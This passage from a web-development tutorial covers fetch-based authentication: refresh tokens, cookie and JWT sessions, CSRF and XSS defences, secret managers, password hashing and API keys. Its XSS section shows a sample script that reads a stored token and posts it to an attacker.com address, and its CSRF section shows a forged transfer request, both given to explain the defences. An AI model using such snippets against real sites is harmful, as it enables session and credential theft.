- Detect and invalidate compromised token families
- Rate-limit refresh endpoint
- Log all refresh attempts

### Mobile/Native App Considerations

**Secure storage on mobile:**

```javascript
// React Native with secure storage
import * as SecureStore from 'expo-secure-store';

async function saveRefreshToken(token) {
  await SecureStore.setItemAsync('refreshToken', token);
}

async function getRefreshToken() {
  return await SecureStore.getItemAsync('refreshToken');
}

// Use Keychain (iOS) or Keystore (Android) through secure storage
```

**Background refresh:**

- Implement refresh before app suspension
- Use background tasks for proactive refresh
- Handle network connectivity changes
- Implement offline queue for failed requests

### Performance Optimization

**Batch requests during refresh:**

```javascript
const pendingRequests = [];
let isRefreshing = false;

async function fetchWithAuth(url, options = {}) {
  if (isRefreshing) {
    // Queue request until refresh completes
    return new Promise((resolve, reject) => {
      pendingRequests.push({ resolve, reject, url, options });
    });
  }
  
  const token = await getValidAccessToken();
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  const response = await fetch(url, { ...options, headers });
  
  if (response.status === 401 && !isRefreshing) {
    isRefreshing = true;
    
    try {
      await refreshAccessToken();
      
      // Retry all pending requests
      pendingRequests.forEach(async ({ resolve, reject, url, options }) => {
        try {
          const retryHeaders = {
            ...options.headers,
            'Authorization': `Bearer ${accessToken}`
          };
          const retryResponse = await fetch(url, { ...options, headers: retryHeaders });
          resolve(retryResponse);
        } catch (error) {
          reject(error);
        }
      });
      
      pendingRequests.length = 0;
      
      // Retry original request
      const retryHeaders = {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      };
      return fetch(url, { ...options, headers: retryHeaders });
      
    } finally {
      isRefreshing = false;
    }
  }
  
  return response;
}
```

---

## Session Management (Authentication)

### Cookie-Based Session Management

#### Setting Cookies from Server

The server sets session cookies in the response headers:

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

#### Cookie Attributes

**HttpOnly** Prevents JavaScript access to the cookie:

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

The cookie is only sent in HTTP requests, not accessible via `document.cookie`.

**Secure** Cookie only sent over HTTPS:

```http
Set-Cookie: sessionId=abc123; Secure
```

**SameSite** Controls cross-site cookie sending:

- `SameSite=Strict`: Cookie never sent in cross-site requests
- `SameSite=Lax`: Cookie sent in top-level navigation (clicking links), not in cross-site subrequests
- `SameSite=None`: Cookie sent in all contexts (requires `Secure`)

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure
```

**Domain and Path** Scope the cookie to specific domains/paths:

```http
Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/api
```

**Max-Age and Expires** Control cookie lifetime:

```http
Set-Cookie: sessionId=abc123; Max-Age=3600
Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

#### Sending Cookies with Fetch

**Same-Origin Requests** Cookies sent automatically by default:

```javascript
fetch('/api/data'); // Cookies included automatically
```

**Cross-Origin Requests** Require explicit credentials mode:

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include' // Required for cross-origin cookies
});
```

**Credentials Mode Options**

- `'omit'`: Never send cookies
- `'same-origin'`: Send cookies only for same-origin requests (default)
- `'include'`: Always send cookies (requires CORS headers)

#### Server CORS Requirements for Cookies

When using `credentials: 'include'`, the server must respond with:

```http
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
```

**Critical restrictions**:

- `Access-Control-Allow-Origin` cannot be `*`
- Must specify the exact origin
- `Access-Control-Allow-Credentials: true` is required

#### Login Flow with Cookies

**Client Login Request**

```javascript
fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user',
    password: 'pass'
  })
});
```

**Server Response**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"success": true, "user": {...}}
```

**Subsequent Authenticated Requests**

```javascript
fetch('https://api.example.com/protected', {
  credentials: 'include' // Browser automatically includes sessionId cookie
});
```

#### Logout Flow

```javascript
fetch('https://api.example.com/logout', {
  method: 'POST',
  credentials: 'include'
});
```

**Server Logout Response**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=; HttpOnly; Secure; Max-Age=0
```

Setting `Max-Age=0` or `Expires` to a past date deletes the cookie.

### Token-Based Authentication (JWT/Bearer Tokens)

#### Login and Token Retrieval

**Login Request**

```javascript
const response = await fetch('https://api.example.com/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user',
    password: 'pass'
  })
});

const data = await response.json();
const token = data.token; // JWT or bearer token
```

**Server Response**

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expiresIn": 3600,
  "refreshToken": "def456..."
}
```

#### Token Storage Options

**localStorage**

```javascript
localStorage.setItem('authToken', token);

// Retrieve
const token = localStorage.getItem('authToken');
```

**Characteristics**:

- Persists across browser sessions
- Accessible via JavaScript (XSS vulnerability)
- Same-origin only
- No expiration mechanism

**sessionStorage**

```javascript
sessionStorage.setItem('authToken', token);

// Retrieve
const token = sessionStorage.getItem('authToken');
```

**Characteristics**:

- Cleared when tab/window closes
- Accessible via JavaScript (XSS vulnerability)
- Same-origin only
- Per-tab isolation

**Memory (Variable)**

```javascript
let authToken = null;

// After login
authToken = data.token;
```

**Characteristics**:

- Lost on page reload
- Not accessible to other tabs
- Most secure against XSS if properly scoped
- Requires re-authentication on refresh

**Comparison Table**

|Storage|Persistence|XSS Risk|Cross-Tab|Page Reload|
|---|---|---|---|---|
|localStorage|Yes|High|Yes|Survives|
|sessionStorage|Session only|High|No|Survives|
|Memory|No|Lower|No|Lost|
|HttpOnly Cookie|Configurable|None|Yes|Survives|

#### Sending Tokens in Requests

**Authorization Header (Recommended)**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Custom Header**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'X-Auth-Token': token
  }
});
```

[Inference: Custom headers trigger CORS preflight for cross-origin requests]

**Query Parameter (Not Recommended)**

```javascript
fetch(`https://api.example.com/protected?token=${token}`);
```

[Unverified: This approach has security issues as tokens may be logged in server logs and browser history]

#### Complete Token Authentication Pattern

```javascript
class AuthService {
  constructor() {
    this.token = null;
  }

  async login(username, password) {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const data = await response.json();
    this.token = data.token;
    localStorage.setItem('authToken', data.token);
    return data;
  }

  async authenticatedFetch(url, options = {}) {
    if (!this.token) {
      this.token = localStorage.getItem('authToken');
    }

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.token}`
      }
    });

    if (response.status === 401) {
      // Token expired or invalid
      this.logout();
      throw new Error('Authentication required');
    }

    return response;
  }

  logout() {
    this.token = null;
    localStorage.removeItem('authToken');
  }
}
```

### Token Refresh Mechanisms

#### Refresh Token Flow

**Initial Login Response**

```json
{
  "accessToken": "eyJ...",
  "refreshToken": "def...",
  "expiresIn": 900
}
```

**Access Token Expires** When the access token expires (typically 15 minutes), use the refresh token:

```javascript
async function refreshAccessToken() {
  const refreshToken = localStorage.getItem('refreshToken');
  
  const response = await fetch('https://api.example.com/refresh', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ refreshToken })
  });

  const data = await response.json();
  localStorage.setItem('authToken', data.accessToken);
  return data.accessToken;
}
```

#### Automatic Token Refresh

**Intercepting 401 Responses**

```javascript
async function authenticatedFetch(url, options = {}) {
  const token = localStorage.getItem('authToken');
  
  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });

  if (response.status === 401) {
    // Token expired, attempt refresh
    const newToken = await refreshAccessToken();
    
    // Retry original request with new token
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${newToken}`
      }
    });
  }

  return response;
}
```

#### Proactive Token Refresh

**Using Token Expiration Time**

```javascript
function scheduleTokenRefresh(expiresIn) {
  // Refresh 5 minutes before expiration
  const refreshTime = (expiresIn - 300) * 1000;
  
  setTimeout(async () => {
    try {
      await refreshAccessToken();
      // Schedule next refresh
      scheduleTokenRefresh(expiresIn);
    } catch (error) {
      // Refresh failed, redirect to login
      window.location.href = '/login';
    }
  }, refreshTime);
}

// After login
scheduleTokenRefresh(data.expiresIn);
```

### Handling Authentication State

#### Checking Authentication Status

**Token Verification Endpoint**

```javascript
async function checkAuthStatus() {
  const token = localStorage.getItem('authToken');
  
  if (!token) {
    return false;
  }

  try {
    const response = await fetch('https://api.example.com/verify', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });

    return response.ok;
  } catch (error) {
    return false;
  }
}
```

**Client-Side JWT Decoding**

```javascript
function decodeJWT(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64)
      .split('')
      .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
      .join('')
  );

  return JSON.parse(jsonPayload);
}

function isTokenExpired(token) {
  const decoded = decodeJWT(token);
  const currentTime = Date.now() / 1000;
  return decoded.exp < currentTime;
}
```

[Unverified: Client-side JWT validation does not verify signature and should not be solely relied upon for security decisions]

#### Route Protection

**Redirect Unauthenticated Users**

```javascript
async function protectedRoute() {
  const isAuthenticated = await checkAuthStatus();
  
  if (!isAuthenticated) {
    window.location.href = '/login';
    return;
  }

  // Load protected content
  loadProtectedContent();
}
```

### Security Considerations

#### XSS Protection

**Token Storage Vulnerabilities** Tokens stored in `localStorage` or `sessionStorage` are vulnerable to XSS attacks:

```javascript
// Malicious script can access token
const stolenToken = localStorage.getItem('authToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Mitigation Strategies**:

- Use `HttpOnly` cookies when possible
- Implement Content Security Policy (CSP)
- Sanitize user input
- Use framework XSS protections

#### CSRF Protection

**Cookie-Based Sessions are Vulnerable** Cookies are automatically sent with requests, making them vulnerable to CSRF:

```html
<!-- Attacker's page -->
<img src="https://api.example.com/transfer?amount=1000&to=attacker" />
```

**CSRF Token Pattern**

```javascript
// Server includes CSRF token in response
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('https://api.example.com/action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ data: 'value' })
});
```

**SameSite Cookie Attribute**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

[Inference: `SameSite=Strict` provides strong CSRF protection by preventing cookies from being sent in cross-site requests]

#### Token-Based CSRF Resistance

Bearer tokens in `Authorization` headers are not automatically sent by browsers:

```javascript
// Attacker cannot trigger this from their site
fetch('https://api.example.com/action', {
  headers: {
    'Authorization': `Bearer ${token}` // Not automatically included
  }
});
```

[Inference: This provides inherent CSRF protection as the attacker cannot access the token from a different origin]

### Hybrid Approaches

#### Dual Token Strategy

**Access Token in Memory, Refresh Token in HttpOnly Cookie**

```javascript
// Login response sets HttpOnly refresh cookie
// Client stores access token in memory
let accessToken = null;

fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({ username, password })
})
.then(response => response.json())
.then(data => {
  accessToken = data.accessToken; // Short-lived, in memory
  // refreshToken automatically stored in HttpOnly cookie
});
```

**Benefits**:

- Access token not vulnerable to XSS (memory only)
- Refresh token not accessible to JavaScript (HttpOnly)
- Refresh token protected from CSRF (SameSite)

**Refresh Flow**

```javascript
async function refreshToken() {
  const response = await fetch('https://api.example.com/refresh', {
    method: 'POST',
    credentials: 'include' // Sends HttpOnly refresh cookie
  });

  const data = await response.json();
  accessToken = data.accessToken;
}
```

### Session Management Patterns

#### Concurrent Session Handling

**Single Session Per User** Server invalidates previous sessions on new login:

```javascript
// Server-side logic
async function login(userId, newSessionId) {
  await invalidateAllUserSessions(userId);
  await createSession(userId, newSessionId);
}
```

**Multiple Concurrent Sessions** Allow users to be logged in on multiple devices:

```javascript
// Each device gets unique session identifier
Set-Cookie: sessionId=device1_abc123; ...
Set-Cookie: sessionId=device2_xyz789; ...
```

#### Session Expiration

**Absolute Timeout** Session expires after fixed duration regardless of activity:

```javascript
const expiresAt = Date.now() + (24 * 60 * 60 * 1000); // 24 hours
```

**Idle Timeout** Session expires after period of inactivity:

```javascript
let lastActivity = Date.now();

function resetIdleTimer() {
  lastActivity = Date.now();
}

// Check idle timeout
setInterval(() => {
  const idleTime = Date.now() - lastActivity;
  if (idleTime > 15 * 60 * 1000) { // 15 minutes
    logout();
  }
}, 60000); // Check every minute

// Reset on user activity
document.addEventListener('click', resetIdleTimer);
document.addEventListener('keypress', resetIdleTimer);
```

**Sliding Window** Session extends with each request:

```http
Set-Cookie: sessionId=abc123; Max-Age=3600
```

Each authenticated request resets the `Max-Age`.

#### Session Persistence Across Page Loads

**Using sessionStorage**

```javascript
// Before page unload
window.addEventListener('beforeunload', () => {
  sessionStorage.setItem('authState', JSON.stringify({
    token: accessToken,
    user: currentUser
  }));
});

// On page load
window.addEventListener('load', () => {
  const authState = sessionStorage.getItem('authState');
  if (authState) {
    const { token, user } = JSON.parse(authState);
    accessToken = token;
    currentUser = user;
  }
});
```

### Multi-Tab Synchronization

#### Broadcasting Auth State Changes

**Using BroadcastChannel API**

```javascript
const authChannel = new BroadcastChannel('auth_channel');

// On login
authChannel.postMessage({ type: 'login', token: accessToken });

// On logout
authChannel.postMessage({ type: 'logout' });

// Listen in other tabs
authChannel.addEventListener('message', (event) => {
  if (event.data.type === 'login') {
    accessToken = event.data.token;
    updateUIForLoggedInUser();
  } else if (event.data.type === 'logout') {
    accessToken = null;
    updateUIForLoggedOutUser();
  }
});
```

**Using localStorage Events**

```javascript
// On logout in one tab
localStorage.removeItem('authToken');

// Listen in other tabs
window.addEventListener('storage', (event) => {
  if (event.key === 'authToken') {
    if (event.newValue === null) {
      // Token removed, user logged out
      handleLogout();
    } else {
      // New token set
      handleLogin(event.newValue);
    }
  }
});
```

### Error Handling

#### Authentication Errors

**401 Unauthorized**

```javascript
fetch('https://api.example.com/protected', {
  headers: { 'Authorization': `Bearer ${token}` }
})
.then(response => {
  if (response.status === 401) {
    // Token invalid or expired
    return handleAuthenticationError();
  }
  return response.json();
});

async function handleAuthenticationError() {
  // Try refresh
  try {
    await refreshAccessToken();
    // Retry request
  } catch (error) {
    // Refresh failed, redirect to login
    window.location.href = '/login';
  }
}
```

**403 Forbidden**

```javascript
if (response.status === 403) {
  // User authenticated but lacks permissions
  showErrorMessage('You do not have permission to access this resource');
}
```

#### Network Errors

**Handling Offline Scenarios**

```javascript
async function authenticatedFetch(url, options) {
  try {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    return response;
  } catch (error) {
    if (!navigator.onLine) {
      // User is offline
      showOfflineMessage();
    } else {
      // Other network error
      throw error;
    }
  }
}
```

---

## Secure Credential Storage

### Environment Variables

The most common approach for storing credentials outside of code.

**Basic usage:**

```javascript
// .env file (never commit to version control)
API_KEY=sk_live_abc123xyz789
DATABASE_URL=postgresql://user:password@localhost:5432/db
JWT_SECRET=your-secret-key-here
STRIPE_SECRET_KEY=sk_test_xxxxx

// Access in Node.js with dotenv
require('dotenv').config();

const apiKey = process.env.API_KEY;
const dbUrl = process.env.DATABASE_URL;
```

**Security rules:**

- Add `.env` to `.gitignore`
- Never hardcode credentials in source code
- Use different credentials per environment (dev/staging/prod)
- Rotate credentials regularly

**.gitignore example:**

```
.env
.env.local
.env.*.local
config/credentials.json
secrets/
```

**Environment-specific files:**

```bash
.env.development
.env.test
.env.production
```

```javascript
// Load based on NODE_ENV
require('dotenv').config({
  path: `.env.${process.env.NODE_ENV || 'development'}`
});
```

### Secret Management Services

**AWS Secrets Manager:**

```javascript
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const client = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName) {
  try {
    const command = new GetSecretValueCommand({ SecretId: secretName });
    const data = await client.send(command);
    
    if (data.SecretString) {
      return JSON.parse(data.SecretString);
    }
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const dbCredentials = await getSecret('prod/database/credentials');
const { username, password, host } = dbCredentials;
```

**Azure Key Vault:**

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
const credential = new DefaultAzureCredential();
const client = new SecretClient(vaultUrl, credential);

async function getSecret(secretName) {
  try {
    const secret = await client.getSecret(secretName);
    return secret.value;
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const apiKey = await getSecret('api-key');
```

**Google Cloud Secret Manager:**

```javascript
const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');

const client = new SecretManagerServiceClient();

async function getSecret(projectId, secretName, version = 'latest') {
  const name = `projects/${projectId}/secrets/${secretName}/versions/${version}`;
  
  try {
    const [response] = await client.accessSecretVersion({ name });
    const payload = response.payload.data.toString('utf8');
    return payload;
  } catch (error) {
    console.error('Error accessing secret:', error);
    throw error;
  }
}

// Usage
const apiKey = await getSecret('my-project', 'api-key');
```

**HashiCorp Vault:**

```javascript
const vault = require('node-vault')({
  apiVersion: 'v1',
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN
});

async function getSecret(path) {
  try {
    const result = await vault.read(path);
    return result.data;
  } catch (error) {
    console.error('Error reading from Vault:', error);
    throw error;
  }
}

// Usage
const credentials = await getSecret('secret/data/myapp/database');
const { username, password } = credentials.data;
```

### Client-Side Credential Storage

**Never store sensitive credentials in:**

- LocalStorage
- SessionStorage
- Cookies without proper flags
- Client-side code
- Browser memory beyond session duration

**Token storage patterns:**

**In-memory storage (most secure for SPAs):**

```javascript
// Store tokens in closure
const TokenStore = (() => {
  let accessToken = null;
  let refreshToken = null;
  
  return {
    setTokens(access, refresh) {
      accessToken = access;
      refreshToken = refresh;
    },
    
    getAccessToken() {
      return accessToken;
    },
    
    getRefreshToken() {
      return refreshToken;
    },
    
    clearTokens() {
      accessToken = null;
      refreshToken = null;
    }
  };
})();

// Use with fetch
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${TokenStore.getAccessToken()}`
  }
});
```

**HttpOnly cookies (recommended for web apps):**

```javascript
// Server-side (Node.js/Express)
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Authenticate user...
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);
  
  // Set HttpOnly cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,      // Prevents JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 15 * 60 * 1000  // 15 minutes
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({ success: true });
});

// Client-side fetch (cookies sent automatically)
fetch('/api/data', {
  credentials: 'include'  // Include cookies
});
```

**Secure cookie configuration:**

```javascript
const cookieOptions = {
  httpOnly: true,           // No JavaScript access
  secure: true,             // HTTPS only (set to false in dev if using HTTP)
  sameSite: 'strict',       // Strict CSRF protection
  domain: '.example.com',   // Subdomain sharing if needed
  path: '/',                // Cookie path
  maxAge: 3600000          // 1 hour in milliseconds
};

// For refresh tokens (longer duration)
const refreshCookieOptions = {
  ...cookieOptions,
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  path: '/auth/refresh'              // Limit to refresh endpoint only
};
```

### Encryption at Rest

**Encrypting sensitive data in database:**

```javascript
const crypto = require('crypto');

class CredentialEncryption {
  constructor(encryptionKey) {
    // Key should be 32 bytes for AES-256
    this.algorithm = 'aes-256-gcm';
    this.key = Buffer.from(encryptionKey, 'hex');
  }
  
  encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    // Return IV, authTag, and encrypted data together
    return {
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      encrypted: encrypted
    };
  }
  
  decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      this.algorithm,
      this.key,
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Usage
const encryptionKey = process.env.ENCRYPTION_KEY; // 64 hex characters
const encryption = new CredentialEncryption(encryptionKey);

// Store in database
const apiKey = 'sk_live_abc123';
const encrypted = encryption.encrypt(apiKey);
await db.storeCredential({
  userId: user.id,
  iv: encrypted.iv,
  authTag: encrypted.authTag,
  encryptedValue: encrypted.encrypted
});

// Retrieve from database
const stored = await db.getCredential(user.id);
const decrypted = encryption.decrypt({
  iv: stored.iv,
  authTag: stored.authTag,
  encrypted: stored.encryptedValue
});
```

**Key derivation for user-specific encryption:**

```javascript
const crypto = require('crypto');

function deriveKey(masterKey, userId, salt) {
  return crypto.pbkdf2Sync(
    `${masterKey}:${userId}`,
    salt,
    100000,  // iterations
    32,      // key length
    'sha256'
  );
}

// Usage
const masterKey = process.env.MASTER_ENCRYPTION_KEY;
const salt = crypto.randomBytes(16);
const userKey = deriveKey(masterKey, user.id, salt);

// Store salt with encrypted data
await db.storeCredential({
  userId: user.id,
  salt: salt.toString('hex'),
  encrypted: encrypt(apiKey, userKey)
});
```

### Password Hashing

**Never store passwords in plain text or use reversible encryption.**

**bcrypt (recommended):**

```javascript
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
  const saltRounds = 12;  // Higher = more secure but slower
  const hash = await bcrypt.hash(password, saltRounds);
  return hash;
}

// Verify password
async function verifyPassword(password, hash) {
  const match = await bcrypt.compare(password, hash);
  return match;
}

// Usage in registration
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  
  const hashedPassword = await hashPassword(password);
  
  await db.users.create({
    username,
    password: hashedPassword
  });
  
  res.json({ success: true });
});

// Usage in login
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findOne({ username });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const isValid = await verifyPassword(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate token...
  res.json({ token });
});
```

**Argon2 (newer, more secure):**

```javascript
const argon2 = require('argon2');

// Hash password
async function hashPassword(password) {
  try {
    const hash = await argon2.hash(password, {
      type: argon2.argon2id,  // Recommended variant
      memoryCost: 65536,      // 64 MB
      timeCost: 3,            // Iterations
      parallelism: 4          // Threads
    });
    return hash;
  } catch (error) {
    console.error('Hashing error:', error);
    throw error;
  }
}

// Verify password
async function verifyPassword(password, hash) {
  try {
    return await argon2.verify(hash, password);
  } catch (error) {
    console.error('Verification error:', error);
    return false;
  }
}
```

### API Key Management

**Generating secure API keys:**

```javascript
const crypto = require('crypto');

function generateApiKey(prefix = 'sk') {
  const randomBytes = crypto.randomBytes(32);
  const key = randomBytes.toString('base64url');
  return `${prefix}_${key}`;
}

// Usage
const apiKey = generateApiKey('live'); // live_xxxxxxxxxxxxx
```

**Storing API keys with hashing:**

```javascript
const crypto = require('crypto');

function hashApiKey(apiKey) {
  return crypto
    .createHash('sha256')
    .update(apiKey)
    .digest('hex');
}

// When user generates API key
app.post('/api/keys', async (req, res) => {
  const apiKey = generateApiKey();
  const hashedKey = hashApiKey(apiKey);
  
  await db.apiKeys.create({
    userId: req.user.id,
    keyHash: hashedKey,
    prefix: apiKey.substring(0, 10),  // For user identification
    createdAt: new Date()
  });
  
  // Show key only once
  res.json({ 
    apiKey,
    message: 'Save this key securely. It will not be shown again.' 
  });
});

// When validating API key
async function validateApiKey(providedKey) {
  const hashedKey = hashApiKey(providedKey);
  const apiKeyRecord = await db.apiKeys.findOne({ keyHash: hashedKey });
  
  if (!apiKeyRecord) {
    return null;
  }
  
  // Update last used timestamp
  await db.apiKeys.update(
    { id: apiKeyRecord.id },
    { lastUsed: new Date() }
  );
  
  return apiKeyRecord.userId;
}
```

**API key middleware:**

```javascript
async function apiKeyAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing API key' });
  }
  
  const apiKey = authHeader.substring(7);
  
  try {
    const userId = await validateApiKey(apiKey);
    
    if (!userId) {
      return res.status(401).json({ error: 'Invalid API key' });
    }
    
    req.userId = userId;
    next();
  } catch (error) {
    console.error('API key validation error:', error);
    res.status(500).json({ error: 'Authentication error' });
  }
}

// Usage
app.get('/api/protected', apiKeyAuth, (req, res) => {
  res.json({ message: 'Access granted', userId: req.userId });
});
```

### JWT Token Security

**Token generation and validation:**

```javascript
const jwt = require('jsonwebtoken');

// Generate access token (short-lived)
function generateAccessToken(userId, claims = {}) {
  return jwt.sign(
    { 
      userId,
      type: 'access',
      ...claims
    },
    process.env.JWT_SECRET,
    { 
      expiresIn: '15m',
      issuer: 'your-app-name',
      audience: 'your-app-users'
    }
  );
}

// Generate refresh token (long-lived)
function generateRefreshToken(userId) {
  const tokenId = crypto.randomBytes(16).toString('hex');
  
  return jwt.sign(
    { 
      userId,
      type: 'refresh',
      tokenId
    },
    process.env.JWT_REFRESH_SECRET,
    { 
      expiresIn: '7d',
      issuer: 'your-app-name'
    }
  );
}

// Verify token
function verifyAccessToken(token) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'your-app-name',
      audience: 'your-app-users'
    });
    
    if (decoded.type !== 'access') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      throw new Error('Token expired');
    }
    if (error.name === 'JsonWebTokenError') {
      throw new Error('Invalid token');
    }
    throw error;
  }
}
```

**Token refresh flow:**

```javascript
// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    
    // Check if token is revoked
    const isRevoked = await db.revokedTokens.exists(decoded.tokenId);
    if (isRevoked) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    
    // Generate new access token
    const newAccessToken = generateAccessToken(decoded.userId);
    
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.json({ success: true });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

**Token revocation:**

```javascript
// Store token IDs in database or Redis
const tokenRevocationList = new Set();

function revokeToken(tokenId) {
  tokenRevocationList.add(tokenId);
  // Or store in Redis/database with expiration
}

function isTokenRevoked(tokenId) {
  return tokenRevocationList.has(tokenId);
}

// Logout endpoint
app.post('/auth/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    try {
      const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
      revokeToken(decoded.tokenId);
    } catch (error) {
      // Token already invalid
    }
  }
  
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  res.json({ success: true });
});
```

### Secrets in CI/CD Pipelines

**GitHub Actions:**

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Deploy to production
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          API_KEY: ${{ secrets.API_KEY }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          npm run deploy
```

**GitLab CI:**

```yaml
# .gitlab-ci.yml
deploy:
  stage: deploy
  script:
    - npm run deploy
  variables:
    DATABASE_URL: $DATABASE_URL
    API_KEY: $API_KEY
  only:
    - main
```

**Environment-specific secrets:**

```yaml
# Different secrets per environment
deploy-staging:
  environment: staging
  variables:
    DATABASE_URL: $STAGING_DATABASE_URL
    API_KEY: $STAGING_API_KEY

deploy-production:
  environment: production
  variables:
    DATABASE_URL: $PROD_DATABASE_URL
    API_KEY: $PROD_API_KEY
```

### Credential Rotation

**Automated rotation pattern:**

```javascript
class CredentialRotationManager {
  constructor() {
    this.currentKey = null;
    this.previousKey = null;
    this.rotationInterval = 30 * 24 * 60 * 60 * 1000; // 30 days
  }
  
  async rotateCredentials() {
    // Generate new credentials
    const newKey = await this.generateNewKey();
    
    // Store previous key for grace period
    this.previousKey = this.currentKey;
    this.currentKey = newKey;
    
    // Update in secret manager
    await this.updateSecretManager(newKey);
    
    // Notify dependent services
    await this.notifyServices(newKey);
    
    // Schedule removal of old key after grace period
    setTimeout(() => {
